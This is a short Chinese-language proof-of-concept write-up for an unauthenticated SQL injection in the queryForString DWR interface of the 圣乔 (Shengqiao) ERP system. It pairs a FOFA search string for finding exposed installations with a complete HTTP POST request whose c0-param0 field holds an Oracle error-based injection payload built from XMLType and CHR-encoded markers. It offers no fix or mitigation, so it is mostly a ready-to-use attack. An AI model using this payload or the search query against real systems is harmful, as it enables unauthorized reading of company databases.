# 圣乔ERP系统queryForString存在SQL注入漏洞

圣乔ERP系统 queryForString 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息

## fofa

```javascript
title="圣乔ERP系统"
```

## poc

```javascript
POST /erp/dwr/call/plaincall/NamedParameterSingleRowQueryConvertor.queryForString.dwr HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Connection: close

c0-id=0
batchId=0
callCount=1
c0-param1=Object_Object:{}
page=/erp/dwr/test/NamedParameterSingleRowQueryConvertor
httpSessionId=47CA299619667847F1BB450454E6C2D4
scriptSessionId=F3F037EB7A5102043AD4CEB47EB17A7275
c0-scriptName=NamedParameterSingleRowQueryConvertor
c0-methodName=queryForString
c0-param0=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(122)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (99=99) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(122)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)
```

![image-20241211210001578](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412112100655.png)